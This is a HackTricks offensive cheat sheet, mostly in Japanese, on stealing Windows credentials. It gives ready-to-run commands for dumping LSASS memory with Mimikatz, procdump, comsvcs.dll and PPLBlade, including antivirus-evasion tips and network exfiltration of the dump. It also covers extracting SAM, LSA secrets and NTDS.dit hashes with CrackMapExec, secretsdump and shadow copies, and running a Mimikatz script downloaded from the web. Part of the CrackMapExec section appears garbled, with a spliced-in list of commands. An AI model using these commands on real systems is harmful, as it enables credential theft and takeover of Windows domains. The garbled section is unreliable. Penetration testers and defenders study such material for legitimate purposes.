# Stealing Windows Credentials

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatzができる他のことについては、** [**このページ**](credentials-mimikatz.md) **で確認してください。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**いくつかの可能な資格情報保護についてはこちらを参照してください。**](credentials-protections.md) **これらの保護は、Mimikatzが一部の資格情報を抽出するのを防ぐことができます。**

## Meterpreterを使用した資格情報

被害者の内部で**パスワードとハッシュを検索するために**、私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)を使用してください。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**はMicrosoftの正当なツール**であるため、Defenderには検出されません。\
このツールを使用して**lsassプロセスをダンプ**し、**ダンプをダウンロード**して、ダンプから**ローカルで資格情報を抽出**することができます。

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}

{% endcode %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) を使って自動的に行われます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**: 一部の **AV** は **procdump.exe を使って lsass.exe をダンプする** ことを **悪意のある行為** として **検出** する場合があります。これは、**"procdump.exe" と "lsass.exe"** という文字列を **検出** しているためです。そのため、**lsass.exe の PID** を procdump に **引数** として渡す方が **ステルス性** が高いです。**lsass.exe の名前** を渡すのではなく。

### **comsvcs.dll** を使って lsass をダンプする

`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ時に **プロセスメモリをダンプ** する役割を持っています。この DLL には **`MiniDumpW`** という **関数** が含まれており、`rundll32.exe` を使って呼び出すように設計されています。\
最初の二つの引数は無関係ですが、三つ目の引数は三つのコンポーネントに分かれています。ダンプするプロセス ID が最初のコンポーネント、ダンプファイルの場所が二つ目、三つ目のコンポーネントは厳密に **full** という単語です。他の選択肢はありません。\
これらの三つのコンポーネントを解析すると、DLL はダンプファイルを作成し、指定されたプロセスのメモリをこのファイルに転送します。\
**comsvcs.dll** を利用して lsass プロセスをダンプすることが可能であり、procdump をアップロードして実行する必要がなくなります。この方法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) に記載されています。

実行には次のコマンドが使用されます:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy) **で自動化できます。**

### **Task Managerを使ってlsassをダンプする**

1. タスクバーを右クリックし、タスクマネージャーをクリック
2. 詳細をクリック
3. プロセスタブで「Local Security Authority Process」プロセスを検索
4. 「Local Security Authority Process」プロセスを右クリックし、「ダンプファイルの作成」をクリック

### procdumpを使ってlsassをダンプする

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) スイートの一部であるMicrosoft署名のバイナリです。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、メモリダンプを難読化し、ディスクに保存せずにリモートワークステーションに転送することをサポートするProtected Process Dumper Toolです。

**主な機能**:

1. PPL保護のバイパス
2. Defenderのシグネチャベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
3. ディスクに保存せずにRAWおよびSMBアップロード方法でメモリダンプをアップロード（ファイルレスダンプ）

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump SAM hashes

SAMハッシュをダンプする
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA シークレットのダンプ

LSA シークレットをダンプするには、以下のコマンドを使用します。

```shell
mimikatz # sekurlsa::secrets
```

このコマンドは、システム上の LSA シークレットを抽出します。
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### ターゲットDCからNTDS.ditをダンプする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### ターゲットDCからNTDS.ditパスワード履歴をダンプする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各NTDS.ditアカウントのpwdLastSet属性を表示する

```shell
dsquery * -filter "(&(objectCategory=person)(objectClass=user))" -attr samAccountName,pwdLastSet
```

### Crackmapexecを使用してパスワードをダンプする

```shell
crackmapexec smb <target_ip> -u <username> -p <password> --ntds drsuapi
```

### Mimikatzを使用してパスワードをダンプする

```shell
lsadump::dcsync /domain:<domain> /user:<username>
```

### Invoke-Mimikatzを使用してパスワードをダンプする

```shell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /user:<username>"'
```

### Secretsdumpを使用してパスワードをダンプする

```shell
secretsdump.py <domain>/<username>:<password>@<target_ip>
```

### Mimikatzを使用してLSASSからパスワードをダンプする

```shell
sekurlsa::logonpasswords
```

### Procdumpを使用してLSASSからパスワードをダンプする

```shell
procdump -accepteula -ma lsass.exe lsass.dmp
```

### Mimikatzを使用してLSASSダンプからパスワードを抽出する

```shell
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### SharpHoundを使用してBloodHoundデータを収集する

```shell
SharpHound.exe -c All
```

### Rubeusを使用してチケットをリクエストする

```shell
Rubeus.exe asktgt /user:<username> /rc4:<hash> /domain:<domain>
```

### Rubeusを使用してチケットをインポートする

```shell
Rubeus.exe ptt /ticket:<ticket>
```

### Rubeusを使用してチケットをリストする

```shell
Rubeus.exe klist
```

### Rubeusを使用してチケットを削除する

```shell
Rubeus.exe purge
```
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

これらのファイルは _C:\windows\system32\config\SAM_ および _C:\windows\system32\config\SYSTEM_ に**あります**。しかし、これらは保護されているため、**通常の方法ではコピーできません**。

### レジストリから

これらのファイルを盗む最も簡単な方法は、レジストリからコピーを取得することです:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**これらのファイルをダウンロード**してKaliマシンに保存し、以下のコマンドで**ハッシュを抽出**します:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

このサービスを使用して保護されたファイルのコピーを実行できます。管理者である必要があります。

#### vssadminの使用

vssadminバイナリはWindows Serverバージョンでのみ利用可能です。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
しかし、**Powershell**から同じことができます。これは**SAMファイルをコピーする方法**の例です（使用されるハードドライブは「C:」で、C:\users\Publicに保存されます）が、これは任意の保護されたファイルをコピーするために使用できます:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

最後に、SAM、SYSTEM、および ntds.dit のコピーを作成するために [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使用することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit**ファイルは**Active Directory**の中心であり、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。このファイルにはドメインユーザーの**パスワードハッシュ**が保存されています。このファイルは**Extensible Storage Engine (ESE)**データベースであり、**_%SystemRoom%/NTDS/ntds.dit_**に存在します。

このデータベース内には、主に3つのテーブルが維持されています：

- **Data Table**: ユーザーやグループなどのオブジェクトに関する詳細を保存する役割を担っています。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの**セキュリティ記述子**がここに保持され、保存されたオブジェクトのセキュリティとアクセス制御を確保します。

詳細情報はこちら: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windowsは_Ntdsa.dll_を使用してそのファイルと対話し、_lsass.exe_によって使用されます。そのため、**NTDS.dit**ファイルの**一部**は**`lsass`のメモリ内**に存在する可能性があります（**キャッシュ**を使用することでパフォーマンスが向上するため、最新のアクセスデータを見つけることができます）。

#### NTDS.dit内のハッシュを復号化する

ハッシュは3回暗号化されています：

1. **BOOTKEY**と**RC4**を使用してパスワード暗号化キー（**PEK**）を復号化します。
2. **PEK**と**RC4**を使用して**ハッシュ**を復号化します。
3. **DES**を使用して**ハッシュ**を復号化します。

**PEK**は**すべてのドメインコントローラーで同じ値**を持ちますが、**NTDS.dit**ファイル内で**ドメインコントローラーのSYSTEMファイルのBOOTKEY（ドメインコントローラー間で異なる）**を使用して暗号化されています。このため、NTDS.ditファイルから資格情報を取得するには、**NTDS.ditとSYSTEMファイル**（_C:\Windows\System32\config\SYSTEM_）が必要です。

### Ntdsutilを使用してNTDS.ditをコピーする

Windows Server 2008以降で利用可能。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**volume shadow copy**](./#stealing-sam-and-system) トリックを使用して **ntds.dit** ファイルをコピーすることもできます。また、**SYSTEM file** のコピーも必要です（再度、[**レジストリからダンプするか、volume shadow copy**](./#stealing-sam-and-system) トリックを使用してください）。

### **NTDS.dit からハッシュを抽出する**

**NTDS.dit** と **SYSTEM** ファイルを**取得**したら、_secretsdump.py_ のようなツールを使用して**ハッシュを抽出**できます:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
有効なドメイン管理者ユーザーを使用して**自動的に抽出**することもできます:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**大きなNTDS.ditファイル**の場合、[gosecretsdump](https://github.com/c-sto/gosecretsdump)を使用して抽出することをお勧めします。

最後に、**metasploitモジュール**: _post/windows/gather/credentials/domain\_hashdump_ または **mimikatz** `lsadump::lsa /inject` を使用することもできます。

### **NTDS.ditからSQLiteデータベースへのドメインオブジェクトの抽出**

NTDSオブジェクトは[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)を使用してSQLiteデータベースに抽出できます。秘密情報だけでなく、取得済みの生のNTDS.ditファイルからさらに情報を抽出するためのオブジェクト全体とその属性も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM`ハイブはオプションですが、秘密の復号化（NT & LMハッシュ、プレーンテキストパスワード、Kerberosまたは信頼キー、NT & LMパスワード履歴などの補足資格情報）を可能にします。他の情報とともに、以下のデータが抽出されます：ユーザーおよびマシンアカウントとそのハッシュ、UACフラグ、最終ログオンとパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループと再帰的メンバーシップ、組織単位ツリーとメンバーシップ、信頼タイプ、方向、および属性を持つ信頼されたドメイン...

## Lazagne

バイナリを[こちら](https://github.com/AlessandroZ/LaZagne/releases)からダウンロードしてください。このバイナリを使用して、いくつかのソフトウェアから資格情報を抽出できます。
```
lazagne.exe all
```
## SAMおよびLSASSから資格情報を抽出するためのその他のツール

### Windows credentials Editor (WCE)

このツールはメモリから資格情報を抽出するために使用できます。以下からダウンロードしてください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAMファイルから資格情報を抽出します
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAMファイルから資格情報を抽出する
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) からダウンロードして、**実行**するだけでパスワードが抽出されます。

## 防御策

[**ここでいくつかの資格情報保護について学びましょう。**](credentials-protections.md)

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksであなたの会社を宣伝**したり、**HackTricksをPDFでダウンロード**したりする場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見てみましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローしましょう。
* **ハッキングのトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。

</details>
